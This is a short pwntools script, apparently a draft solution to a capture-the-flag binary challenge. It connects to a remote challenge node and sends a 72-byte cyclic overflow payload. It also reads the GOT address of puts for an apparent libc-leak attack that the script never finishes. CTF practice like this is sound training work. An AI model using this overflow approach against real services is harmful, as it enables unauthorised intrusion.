from pwn import *
from LibcSearcher import *
context(arch='amd64',os='linux',loglevel='debug')
elf=ELF('./pwn')
p=remote('node4.anna.nssctf.cn',23377)

puts_addr=elf.got['puts']


payload=flat([cyclic(64+8),])

p.sendline(payload)
p.interactive()
